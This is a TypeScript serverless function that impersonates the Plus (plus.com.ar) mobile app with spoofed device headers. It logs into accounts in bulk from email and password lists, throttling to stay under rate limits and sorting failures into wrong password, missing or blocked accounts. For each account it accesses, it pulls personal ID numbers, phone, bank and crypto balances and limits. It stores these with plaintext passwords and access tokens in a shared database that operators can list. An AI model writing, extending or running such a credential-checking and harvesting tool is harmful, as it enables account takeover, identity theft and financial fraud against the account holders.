import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const PLUS_HEADERS = {
  "Accept-Encoding": "gzip",
  "Connection": "Keep-Alive",
  "Content-Type": "application/json",
  "User-Agent": "okhttp/4.12.0",
  "accept": "application/json",
  "mobile-app": "bGCI6D67bJ88",
  "mobile-app-version": "2.2.4",
  "x-channel": "9DF8CB31A4",
  "x-device-manufacturer": "samsung",
  "x-device-model": "SM-S9110",
  "x-device-name": "SM-S9110",
  "x-device-unique-id": "8937364d03a1f0a0",
  "x-os": "android",
};

const AUTH_URL = "https://ms.plus.com.ar/plus/auth/login";
const API_URL = "https://api.plus.com.ar";

async function fetchAccountData(token: string) {
  const authHeader = { ...PLUS_HEADERS, Host: "api.plus.com.ar", authorization: `Bearer ${token}` };
  const body = JSON.stringify({ "front-web": true });

  const [profileRes, balancesRes, fintechRes, limitsRes, cryptoRes] = await Promise.all([
    fetch(`${API_URL}/users/profile`, { method: "POST", headers: authHeader, body }),
    fetch(`${API_URL}/inversions/balances`, { method: "POST", headers: authHeader, body }),
    fetch(`${API_URL}/fintech/profile?front-web=true`, { method: "GET", headers: { ...authHeader, "content-type": "application/json" } }),
    fetch(`${API_URL}/users/all-limits`, { method: "POST", headers: authHeader, body }),
    fetch(`${API_URL}/crypto/balance`, { method: "POST", headers: authHeader, body }),
  ]);

  const [profile, balances, fintech, limits, crypto] = await Promise.all([
    profileRes.json(),
    balancesRes.json(),
    fintechRes.json(),
    limitsRes.json(),
    cryptoRes.json(),
  ]);

  return { profile, balances, fintech, limits, crypto };
}

async function saveAccount(supabase: any, email: string, password: string, token: string, data: any, opCode: string) {
  const { profile, balances, fintech, limits, crypto } = data;
  const fullName = `${profile.first_name || ""} ${profile.last_name || ""}`.trim();

  const { data: existing } = await supabase
    .from("plus_accounts")
    .select("id")
    .eq("email", email)
    .eq("operator_code", opCode)
    .maybeSingle();

  const accountData = {
    email,
    password,
    operator_code: opCode,
    access_token: token,
    full_name: fullName,
    document: profile.document || null,
    cuit: profile.cuit || null,
    phone: profile.profile?.telephone || null,
    city: profile.profile?.city || null,
    province: profile.profile?.province?.name || null,
    profile_data: profile,
    balance_ars: { ars: balances.ars, pendingARS: balances.pendingARS },
    balance_usd: { usd: balances.usd, pendingUSD: balances.pendingUSD },
    fintech_data: fintech,
    limits_data: limits,
    crypto_data: crypto,
    last_login_at: new Date().toISOString(),
    last_data_sync_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  };

  if (existing) {
    await supabase.from("plus_accounts").update(accountData).eq("id", existing.id);
  } else {
    await supabase.from("plus_accounts").insert(accountData);
  }
}

async function loginSingle(email: string, password: string) {
  try {
    const loginRes = await fetch(AUTH_URL, {
      method: "POST",
      headers: { ...PLUS_HEADERS, Host: "ms.plus.com.ar" },
      body: JSON.stringify({ email, password }),
    });
    
    // Handle HTTP errors (rate limit, server errors, etc.)
    if (loginRes.status === 429) {
      return { success: false, email, error: "Rate limit - aguarde" };
    }
    if (loginRes.status >= 500) {
      return { success: false, email, error: `Servidor Plus erro ${loginRes.status}` };
    }
    
    let loginData;
    try {
      loginData = await loginRes.json();
    } catch {
      return { success: false, email, error: `Resposta inválida (HTTP ${loginRes.status})` };
    }
    
    if (!loginRes.ok || !loginData.accessToken) {
      // Map common error messages
      const msg = loginData.message || loginData.error || "";
      if (loginRes.status === 401 || msg.toLowerCase().includes("invalid") || msg.toLowerCase().includes("incorrect") || msg.toLowerCase().includes("wrong")) {
        return { success: false, email, error: "Senha incorreta" };
      }
      if (msg.toLowerCase().includes("not found") || msg.toLowerCase().includes("no existe")) {
        return { success: false, email, error: "Conta não existe" };
      }
      if (msg.toLowerCase().includes("blocked") || msg.toLowerCase().includes("bloqueado")) {
        return { success: false, email, error: "Conta bloqueada" };
      }
      return { success: false, email, error: msg || `Login falhou (HTTP ${loginRes.status})` };
    }
    
    const token = loginData.accessToken;
    const data = await fetchAccountData(token);
    
    // Check if we got complete data (valid profile with name)
    const hasCompleteData = data.profile && 
      (data.profile.first_name || data.profile.last_name) &&
      data.balances && typeof data.balances.ars === 'number';
    
    return { success: true, email, accessToken: token, hasCompleteData, ...data };
  } catch (e: any) {
    return { success: false, email, error: `Erro de rede: ${e.message}` };
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { action, email, password, accessToken, operatorCode, accounts } = await req.json();

    if (action === "login") {
      const result = await loginSingle(email, password);
      if (!result.success) {
        return new Response(JSON.stringify({ error: result.error }), {
          status: 401,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);
      await saveAccount(supabase, email, password, result.accessToken!, result, operatorCode || "master");

      return new Response(JSON.stringify({ success: true, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "bulk") {
      // accounts = [{ email, password }, ...]
      if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
        return new Response(JSON.stringify({ error: "No accounts provided" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);
      const opCode = operatorCode || "master";

      // Process accounts in parallel (max 3 concurrent to avoid rate limits)
      const results: any[] = [];
      const batchSize = 3;
      for (let i = 0; i < accounts.length; i += batchSize) {
        const batch = accounts.slice(i, i + batchSize);
        const batchResults = await Promise.all(
          batch.map(async (acc: { email: string; password: string }) => {
            try {
              const result = await loginSingle(acc.email, acc.password);
              if (result.success) {
                await saveAccount(supabase, acc.email, acc.password, result.accessToken!, result, opCode);
              }
              return result;
            } catch (e: any) {
              return { success: false, email: acc.email, error: e.message };
            }
          })
        );
        results.push(...batchResults);
      }

      return new Response(JSON.stringify({ success: true, results }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "list") {
      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
      const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
      const supabase = createClient(supabaseUrl, supabaseKey);
      const opCode = operatorCode || "master";

      let query = supabase
        .from("plus_accounts")
        .select("*")
        .order("updated_at", { ascending: false });

      if (opCode !== "master") {
        query = query.eq("operator_code", opCode);
      }

      const { data: rows, error: dbError } = await query.limit(500);

      if (dbError) {
        return new Response(JSON.stringify({ error: dbError.message }), {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      return new Response(JSON.stringify({ success: true, accounts: rows || [] }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (action === "refresh") {
      const authHeader = { ...PLUS_HEADERS, Host: "api.plus.com.ar", authorization: `Bearer ${accessToken}` };
      const body = JSON.stringify({ "front-web": true });

      const [profileRes, balancesRes, fintechRes, limitsRes, cryptoRes] = await Promise.all([
        fetch(`${API_URL}/users/profile`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/inversions/balances`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/fintech/profile?front-web=true`, { method: "GET", headers: { ...authHeader, "content-type": "application/json" } }),
        fetch(`${API_URL}/users/all-limits`, { method: "POST", headers: authHeader, body }),
        fetch(`${API_URL}/crypto/balance`, { method: "POST", headers: authHeader, body }),
      ]);

      const [profile, balances, fintech, limits, crypto] = await Promise.all([
        profileRes.json(),
        balancesRes.json(),
        fintechRes.json(),
        limitsRes.json(),
        cryptoRes.json(),
      ]);

      return new Response(JSON.stringify({ success: true, profile, balances, fintech, limits, crypto }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ error: "Invalid action" }), {
      status: 400,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Plus auth error:", error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
